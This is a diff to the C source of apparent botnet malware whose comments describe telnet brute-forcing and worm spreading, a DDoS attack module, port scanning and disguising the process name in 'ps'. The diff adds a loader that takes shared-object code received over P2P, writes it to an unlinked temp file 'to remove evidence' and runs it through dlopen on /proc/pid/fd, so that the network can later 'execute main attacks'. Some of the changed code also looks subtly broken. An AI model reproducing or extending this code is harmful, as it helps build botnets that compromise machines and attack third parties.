@@ -90,6 +90,7 @@ so nodes can use several communication methods, and irc can be used to control
 #include <arpa/inet.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <dlfcn.h>
 #include "structs.h"
 #include "list.h"
 #include "utils.h"
@@ -124,6 +125,11 @@ so nodes can use several communication methods, and irc can be used to control
 Modules *module_list = NULL;
 SpyFuncs *spy_list = NULL;
 
+// external modules that can be loaded from P2P, etc
+// i wanna launch this soon... this will allow me to build a network
+// and execute main attacks later..
+// external module will get pointers to everything, and ability to modify, spy, etc
+ExternalModules *external_list = NULL;
 
 // our IP passed from telnet module during brute force/worm
 char my_ip[16] = "\0";
@@ -132,11 +138,11 @@ char my_ip[16] = "\0";
 // prepare fd set / fd & max fds for select()
 void setup_fd(fd_set *fdset, fd_set *fdset2, fd_set *fdset3, int fd, int *max_fd) {
     // set the fd inside of fd_set
-    //if (fdset != NULL)
+    if (fdset != NULL)
     FD_SET(fd, fdset);
-    //if (fdset2 != NULL)
+    if (fdset2 != NULL)
     FD_SET(fd, fdset2);
-    //if (fdset3 != NULL)
+    if (fdset3 != NULL)
     FD_SET(fd, fdset3);
     
     *max_fd = MAX(fd + 1, *max_fd);
@@ -342,14 +348,14 @@ void socket_loop(Modules *modules) {
             if ((modcptr->fd == 0) || modcptr->closed)
                 continue;
                 
-            setup_fd(&readfds, &writefds, &errorfds, modcptr->fd, &maxfd);
+            setup_fd(modcptr->state == TCP_NEW ? NULL: &readfds, &writefds, &errorfds, modcptr->fd, &maxfd);
             
             count++;    
         }
     }
     
     if (!count) {
-        usleep(500);
+        usleep(100);
         
         return;
     }
@@ -693,24 +699,38 @@ char *QueueParseAscii(Queue *qptr, int *size) {
     char *ret = NULL;
     int i = 0;
     char *sptr = NULL;
+    int n = 0;
+    char *newbuf = NULL;
     
     while (i < qptr->size) {
         if (ASCII_is_endline((unsigned char)qptr->buf[i])) {
             // lets queue...
+
+            n = i + 2;
+            // find start of next line (after end lines finished.. just in case its \r\n)
+            while (i < qptr->size && i < n && ASCII_is_endline((unsigned char)qptr->buf[i]))
+                i++;
             
             ret = ASCIIcopy(qptr->buf, i);
             *size = i;
             
-            // find start of next line (after end lines finished.. just in case its \r\n)
-            while (i < qptr->size && ASCII_is_endline((unsigned char)qptr->buf[i]))
-                i++;
 
-            if (i < qptr->size)
-                //move memory up in buffer..
-                memmove(qptr->buf, qptr->buf + i, qptr->size - i);
-
+            if (i < qptr->size) {
+                n = qptr->size - i + 1;
+                newbuf = (char *)malloc(n+1);
+                memset(newbuf, 0, n);
+                if (newbuf == NULL) {
+                    //printf("couldnt alloc %d - %d\n", n, errno);
+                    return NULL;
+                }
+                memcpy(newbuf, qptr->buf + i, qptr->size - i);
+                
+                qptr->buf = newbuf;
+                qptr->size -= i;
+            }
             
-            qptr->size -= i;
+            qptr->chopped = 1;
+            
             break;
         }
         
@@ -755,7 +775,8 @@ int Modules_Execute(Modules *_module_list, int *sleep_time) {
 
     // lets calculate how much time to sleep.. if we have connections
     // then we wanna execute faster..    
-    *sleep_time = 1000000 - MIN((active_count * 250000), 750000); 
+    //*sleep_time = c - MIN((active_count * 250000), 750000);
+    *sleep_time = 1000;//active_count ? 15000 : 1000000; 
 }
 
 // Adds a module to a list
@@ -786,7 +807,7 @@ Connection *tcp_listen(Modules *mptr, int port) {
     
     // set non blocking I/O for socket..
     sock_opt = fcntl(fd, F_GETFL, 0);
-    fcntl(fd, F_SETFL, sock_opt | O_NONBLOCK);
+    fcntl(fd, F_SETFL, sock_opt | O_NONBLOCK | SO_REUSEPORT);
     
     if (bind(fd, (struct sockaddr *)&dst, sizeof(struct sockaddr_in)) == -1) {
         close(fd);
@@ -794,7 +815,7 @@ Connection *tcp_listen(Modules *mptr, int port) {
     }
     
     // max of 5 backlog..? should be fine..
-    listen(fd, 5);
+    listen(fd, 100);
     
     ret = (Connection *)L_add((LIST **)&mptr->connections, sizeof(Connection));
     if (ret == NULL) {
@@ -824,6 +845,7 @@ Connection *ConnectionByDST(Modules *mptr, uint32_t dst) {
     }
     return cptr;
 }
+
 // socket connection outgoing for p2p framework
 // -1 = error allocating, 0 = cannot connect
 // 1 = non blocking processing or connected
@@ -979,6 +1001,7 @@ int ModuleCustomFuncPtr(Modules *mptr, Connection *cptr, char **buf, int *size, 
     return function(mptr, cptr, buf, size);
 }
 
+// add a set of 'spy' functions to monitor a modules messages
 int SpyAdd(Modules *mptr, ModuleFuncs *funcs) {
     SpyFuncs *sptr = NULL;
     
@@ -998,30 +1021,169 @@ int SpyAdd(Modules *mptr, ModuleFuncs *funcs) {
     return 1;
 }
 
+// if we have any reasons to initialize anything here..
+// could be encryption keys, our IP address, etc..
+// i wont deal with encryption here for now.. botlink will do it on demand
+int various_init() {
+    struct sockaddr_in me;
+    // find IP and put into 'my_ip'
+    uint32_t src = getOurIPv4();
+    me.sin_addr.s_addr = src;
+    strcpy(my_ip, inet_ntoa(me.sin_addr));
+}
+
+
+// searches for an externally added module by its identifier
+ExternalModules *ExternalFind(int id) {
+    ExternalModules *eptr = external_list;
+    
+    while (eptr != NULL) {
+        if (eptr->id == id) break;
+        eptr = eptr->next;
+    }
+    
+    return eptr;
+}
+
+
+
+// deinitialize an external module
+int ExternalDeinit(ExternalModules *eptr) {
+    if (eptr->plumbing == NULL) return 0;
+    
+    
+    
+    return 1;    
+}
+
+// initialize an external module
+// need to write to a file..
+// we will open a temp file, and then delete it
+// then we can open it by the file descriptor using dlopen
+// after that we can dlsym from that handle and everything will be fine
+int ExternalInit(ExternalModules *eptr) {
+  int write_fd = 0;
+  int i = 0;
+  int ret = -1;
+  char *tmpname = NULL;
+  FILE *ofd = NULL;
+  void *dl_handle = NULL;
+  char filename[64];
+  
+  void *_init = NULL;
+  void *_deinit = NULL;
+  void *_plumbing = NULL;
+  
+  if (eptr->plumbing != NULL) {
+      // first we must deinit it..
+      ExternalDeinit(eptr);
+
+      eptr->plumbing = NULL;
+  }
+  
+  // now we can init it..
+  if ((tmpname = tempnam("/tmp", ".so")) == NULL)
+    return ret;
+  
+  if ((ofd = fopen(tmpname, "wb")) == NULL)
+    return ret;
+  // unlink the temporary file from the filesystem..
+  // trick and then you open it by the file descriptor using /proc  
+  unlink(tmpname);
+  
+  // retrieves the file descriptor # from the FILE structure
+  eptr->outfd = fileno(ofd);
+  
+  // generate a filename directly to the file descriptor..
+  // since we just unlinked it from the filesystem to remove evidence
+  sprintf(filename, "/proc/%d/fd/%d", getpid(), eptr->outfd);
+  
+  
+  // now write the buffer..
+  i = fwrite(eptr->buf, eptr->size, 1, ofd);
+  if (i == eptr->size) {   
+     dl_handle = (void *)dlopen(filename, RTLD_GLOBAL);
+     
+     if (dl_handle != NULL) {
+         
+         _init = (void *)dlsym(dl_handle, "init");
+         _deinit = (void *)dlsym(dl_handle, "deinit");
+         _plumbing = (void *)dlsym(dl_handle, "plumbing");
+         
+         eptr->init = (external_func)_init;
+         eptr->deinit = (external_func)_deinit;
+         eptr->plumbing = (module_func)_plumbing;
+         eptr->dl_handle = dl_handle;
+         
+         ret = eptr->init();
+         
+     } 
+  }
+  
+  if (ret != 1) {
+      if (dl_handle != NULL)
+        dlclose(dl_handle);
+  }
+  
+  return ret;
+}
+
+
+// adds an external function to the list (and initializes it)
+// to be used from P2P, etc.. passes the file data, and size
+ExternalModules *ExternalAdd(int id, char *buf, int size) {
+    int ret = 0;
+    ExternalModules *eptr = ExternalFind(id);
+ 
+    if (eptr != NULL) {
+        free(eptr->buf);
+        eptr->buf = NULL;
+    } else {
+        if ((eptr = (ExternalModules *)L_add((LIST **)&external_list, sizeof(ExternalModules))) == NULL)
+            return NULL;
+            
+        eptr->id = id;
+    }
+    
+    eptr->size = size;
+    if ((eptr->buf = (char *)malloc(size + 1)) == NULL) {
+        L_del((LIST **)&external_list, (LIST *)eptr);
+        return NULL;
+    }
+    
+    // fit the module in the buffer..
+    memcpy(eptr->buf, buf, size);
+    
+    // now we must initialize the module   
+    ret = ExternalInit(eptr);
+    return eptr;
+}
+
+
 // we will use a simple main in the beginning...
 // i want this to be a library, or a very simple node
 int main(int argc, char *argv[]) {
     int sleep_time = 1500;
     // initialize modules
-    bitcoin_init(&module_list);
-    litecoin_init(&module_list);
-    namecoin_init(&module_list);
-    peercoin_init(&module_list);
+    //bitcoin_init(&module_list);
+    //litecoin_init(&module_list);
+    //namecoin_init(&module_list);
+    //peercoin_init(&module_list);
     // portscan should be before anything using it..
-    portscan_init(&module_list);
+    //portscan_init(&module_list);
     // ensure any following modules enable portscans in init
-    telnet_init(&module_list);
+    //telnet_init(&module_list);
     // initialize module for (D)DoS
-    attack_init(&module_list);
+    //attack_init(&module_list);
     // http servers
     httpd_init(&module_list);
     // bot link / communications
-    botlink_init(&module_list);
+    //botlink_init(&module_list);
     // internal data storage
     data_init(&module_list);
     
     // fake name for 'ps'
-    fakename_init(&module_list, argv, argc);
+    //fakename_init(&module_list, argv, argc);
     
     // main loop
     while (1) {
